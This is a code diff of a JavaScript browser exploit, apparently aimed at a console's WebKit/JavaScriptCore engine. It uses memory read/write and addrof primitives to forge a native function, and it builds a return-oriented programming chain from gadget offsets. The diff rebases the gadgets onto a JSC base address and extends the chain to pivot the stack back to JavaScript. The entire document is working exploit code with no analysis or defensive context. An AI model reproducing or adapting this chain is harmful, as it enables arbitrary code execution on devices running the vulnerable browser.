@@ -597,7 +597,7 @@ for (var i = 0; i < 16; i++) {
 //= ================ END FAKE NATIVE FUNC ================
 
 // Initial code
-var entry = new BigInt(0, 0x189b37).add(eboot_addr) // mov rdi, qword ptr [rax + 0x10] ; call qword ptr [rax + 8]
+var entry = new BigInt(0, 0x18b84f).add(jsc_addr) // mov rdi, qword ptr [rax + 0x10] ; call qword ptr [rax + 8]
 
 // control rip to ret gadget
 prim.write8(fake_exec_addr.add(new BigInt(0, 0x40)), entry)
@@ -611,7 +611,7 @@ var arr_b = new Uint8Array(0x4f0)
 var arr_b_addr = prim.read8(prim.addrof(arr_b).add(new BigInt(0, 0x10)))
 
 // Create arr_c
-var arr_c = new Uint8Array(0x18)
+var arr_c = new Uint8Array(0x88)
 var arr_c_addr = prim.read8(prim.addrof(arr_c).add(new BigInt(0, 0x10)))
 
 // Create arr_d(Custom stack)
@@ -624,40 +624,59 @@ var arr_e_addr = prim.read8(prim.addrof(arr_e).add(new BigInt(0, 0x10)))
 
 // Setup fake native function
 prim.write8(pwn_addr.add(new BigInt(0, 0x00)), new BigInt(0x002A1500, 0x0000002A))
-prim.write8(pwn_addr.add(new BigInt(0, 0x08)), new BigInt(0, 0xe9b0).add(eboot_addr)) // push rbp ; mov rbp, rsp ; mov rax, qword ptr [rdi] ; call qword ptr [rax + 0x20]
-prim.write8(pwn_addr.add(new BigInt(0, 0x10)), arr_a_addr)
 prim.write8(pwn_addr.add(new BigInt(0, 0x18)), fake_exec_addr)
+prim.write8(pwn_addr.add(new BigInt(0, 0x28)), arr_a_addr)
 
 // Setup arr_a values
 prim.write8(arr_a_addr.add(new BigInt(0, 0x00)), arr_c_addr)
-prim.write8(arr_a_addr.add(new BigInt(0, 0x18)), new BigInt(0, 0x3064db).add(base_addr)) // mov rdx, qword ptr [rdx + 0x4e8] ; call qword ptr [rax + 0x40]
+prim.write8(arr_a_addr.add(new BigInt(0, 0x18)), new BigInt(0, 0x3064db).add(jsc_addr)) // mov rdx, qword ptr [rdx + 0x4e8] ; call qword ptr [rax + 0x40]
 prim.write8(arr_a_addr.add(new BigInt(0, 0x20)), arr_b_addr)
-prim.write8(arr_a_addr.add(new BigInt(0, 0x40)), new BigInt(0, 0x12cc60).add(base_addr)) // mov rsp, rdx ; jmp rax
+prim.write8(arr_a_addr.add(new BigInt(0, 0x40)), new BigInt(0, 0x12cc60).add(jsc_addr)) // mov rsp, rdx ; jmp rax
 prim.write8(arr_a_addr.add(new BigInt(0, 0x60)), arr_e_addr)
 
 // Setup arr_b values
 prim.write8(arr_b_addr.add(new BigInt(0, 0x4e8)), new BigInt(0, 0x40)) // random offset that will be used to determine offset to arr_a
 
 // Setup arr_c values
-prim.write8(arr_c_addr.add(new BigInt(0, 0x00)), new BigInt(0, 0x19bd6d).add(base_addr)) // mov rdx, qword ptr [rax + 0x10] ; mov rax, qword ptr [rdi] ; call qword ptr [rax + 0x10]
+prim.write8(arr_c_addr.add(new BigInt(0, 0x00)), new BigInt(0, 0x19bd6d).add(jsc_addr)) // mov rdx, qword ptr [rax + 0x10] ; mov rax, qword ptr [rdi] ; call qword ptr [rax + 0x10]
 prim.write8(arr_c_addr.add(new BigInt(0, 0x08)), new BigInt(0, 0xbf5ce).add(eboot_addr)) // add rdi, 0x60 ; call qword ptr [rax]
 prim.write8(arr_c_addr.add(new BigInt(0, 0x10)), arr_d_addr)
 prim.write8(arr_c_addr.add(new BigInt(0, 0x20)), new BigInt(0, 0x244916).add(eboot_addr)) // mov rdx, qword ptr [rdi + 0x20] ; mov r12, rdi ; call qword ptr [r12 + 0x18]
 prim.write8(arr_c_addr.add(new BigInt(0, 0x40)), new BigInt(0, 0x165df5).add(eboot_addr)) // mov r13, rdx ; call qword ptr [rax + 0x70]
 prim.write8(arr_c_addr.add(new BigInt(0, 0x48)), new BigInt(0, 0x10b5).add(eboot_addr)) // mov rax, qword ptr [rdi] ; call qword ptr [rax + 8]
-prim.write8(arr_c_addr.add(new BigInt(0, 0x70)), new BigInt(0, 0x3068ff).add(base_addr)) // mov rcx, qword ptr [r13 + r12] ; call qword ptr [rax + 0x48]
+prim.write8(arr_c_addr.add(new BigInt(0, 0x48)), new BigInt(0, 0xbf5ce).add(eboot_addr)) // add rdi, 0x60 ; call qword ptr [rax]
+prim.write8(arr_c_addr.add(new BigInt(0, 0x70)), new BigInt(0, 0x3068ff).add(jsc_addr)) // mov rcx, qword ptr [r13 + r12] ; call qword ptr [rax + 0x48]
+prim.write8(arr_c_addr.add(new BigInt(0, 0x80)), new BigInt(0, 0xe9b0).add(eboot_addr)) // push rbp ; mov rbp, rsp ; mov rax, qword ptr [rdi] ; call qword ptr [rax + 0x20]
 
+var rop_idx = 0
 // Setup arr_d values (custom stack)
-prim.write8(arr_d_addr.add(new BigInt(0, 0x00)), new BigInt(0, 0x19e297c).add(base_addr)) // pop r10 ; ret
+prim.write8(arr_d_addr.add(new BigInt(0, 8 * rop_idx++)), new BigInt(0, 0x19e297c).add(jsc_addr)) // pop r10 ; ret
 // for now, end the chain here
 // Setup arr_d to pivot back to JS stack
-prim.write8(arr_d_addr.add(new BigInt(0, 0x08)), new BigInt(0, 0x54094).add(base_addr)) // pop rax ; ret
-prim.write8(arr_d_addr.add(new BigInt(0, 0x10)), new BigInt(0, 8))
-prim.write8(arr_d_addr.add(new BigInt(0, 0x18)), new BigInt(0, 0xbe0e5a).add(base_addr)) // add rbp, rax ; ret
-prim.write8(arr_d_addr.add(new BigInt(0, 0x20)), new BigInt(0, 0x12afca).add(base_addr)) // mov rsp, rbp ; pop rbp ; ret
+prim.write8(arr_d_addr.add(new BigInt(0, 8 * rop_idx++)), new BigInt(0, 0x54094).add(jsc_addr)) // pop rax ; ret
+prim.write8(arr_d_addr.add(new BigInt(0, 8 * rop_idx++)), new BigInt(0, 0x38))
+prim.write8(arr_d_addr.add(new BigInt(0, 8 * rop_idx++)), new BigInt(0, 0xbe0e5a).add(jsc_addr)) // add rbp, rax ; ret
+prim.write8(arr_d_addr.add(new BigInt(0, 8 * rop_idx++)), new BigInt(0, 0x54094).add(jsc_addr)) // pop rax ; ret
+prim.write8(arr_d_addr.add(new BigInt(0, 8 * rop_idx++)), new BigInt(0, 0x4c).add(jsc_addr)) // ret
+prim.write8(arr_d_addr.add(new BigInt(0, 8 * rop_idx++)), new BigInt(0, 0xccb29).add(eboot_addr)) // mov rcx, qword ptr [rbp - 0x38] ; jmp rax
+prim.write8(arr_d_addr.add(new BigInt(0, 8 * rop_idx++)), new BigInt(0, 0x54094).add(jsc_addr)) // pop rax ; ret
+prim.write8(arr_d_addr.add(new BigInt(0, 8 * rop_idx++)), new BigInt(0, 0x54094).add(jsc_addr)) // pop rax ; ret
+prim.write8(arr_d_addr.add(new BigInt(0, 8 * rop_idx++)), new BigInt(0, 0x3d7edc).add(jsc_addr)) // mov r15, rcx ; mov r12, r9 ; call rax
+prim.write8(arr_d_addr.add(new BigInt(0, 8 * rop_idx++)), new BigInt(0, 0x54094).add(jsc_addr)) // pop rax ; ret
+prim.write8(arr_d_addr.add(new BigInt(0, 8 * rop_idx++)), new BigInt(0, 0x54094).add(jsc_addr)) // pop rax ; ret
+prim.write8(arr_d_addr.add(new BigInt(0, 8 * rop_idx++)), new BigInt(0, 0x5015f).add(eboot_addr)) // mov rsi, r15 ; call rax
+prim.write8(arr_d_addr.add(new BigInt(0, 8 * rop_idx++)), new BigInt(0, 0x54094).add(jsc_addr)) // pop rax ; ret
+prim.write8(arr_d_addr.add(new BigInt(0, 8 * rop_idx++)), new BigInt(0, 0x40))
+prim.write8(arr_d_addr.add(new BigInt(0, 8 * rop_idx++)), new BigInt(0, 0xbe0e5a).add(jsc_addr)) // add rbp, rax ; ret
+prim.write8(arr_d_addr.add(new BigInt(0, 8 * rop_idx++)), new BigInt(0, 0x2c3df3).add(jsc_addr)) // pop rcx ; ret
+prim.write8(arr_d_addr.add(new BigInt(0, 8 * rop_idx++)), new BigInt(0, 0x54094).add(jsc_addr)) // pop rax ; ret
+prim.write8(arr_d_addr.add(new BigInt(0, 8 * rop_idx++)), new BigInt(0, 0x204520).add(eboot_addr)) // mov qword ptr [rbp - 0x70], rsi ; jmp rcx
+prim.write8(arr_d_addr.add(new BigInt(0, 8 * rop_idx++)), new BigInt(0xFFFFFFFF, 0xFFFFFF90))
+prim.write8(arr_d_addr.add(new BigInt(0, 8 * rop_idx++)), new BigInt(0, 0xbe0e5a).add(jsc_addr)) // add rbp, rax ; ret
+prim.write8(arr_d_addr.add(new BigInt(0, 8 * rop_idx++)), new BigInt(0, 0x12afca).add(jsc_addr)) // mov rsp, rbp ; pop rbp ; ret
 
 // Setup arr_e values
-prim.write8(arr_e_addr.add(new BigInt(0, 0x10)), new BigInt(0, 0x1282f3).add(base_addr)) // mov rax, qword ptr [rdx] ; call rcx
+prim.write8(arr_e_addr.add(new BigInt(0, 0x10)), new BigInt(0, 0x1282f3).add(jsc_addr)) // mov rax, qword ptr [rdx] ; call rcx
 
 // excecute
 pwn()
